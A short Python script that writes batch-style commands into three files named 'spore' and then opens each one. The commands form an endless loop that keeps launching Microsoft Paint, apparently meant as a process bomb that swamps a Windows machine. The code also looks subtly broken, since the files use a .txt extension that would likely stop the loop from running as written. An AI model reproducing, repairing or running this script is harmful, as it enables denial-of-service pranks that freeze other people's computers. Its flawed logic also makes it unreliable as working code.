#START
import os
RANGE = 3
TEXT = "@Echo off"
NAME = "spore"
TYPE = ".txt"
End = RANGE - 1
for x in range(0, RANGE):
    FINAL = NAME + str(x) + TYPE
    f = open(FINAL, "a")
    f.write(TEXT + '\n')
    f.write(":i" + '\n')
    f.write("start mspaint" + '\n')
    f.write("goto i")
    f.close()
    os.system(FINAL)
#END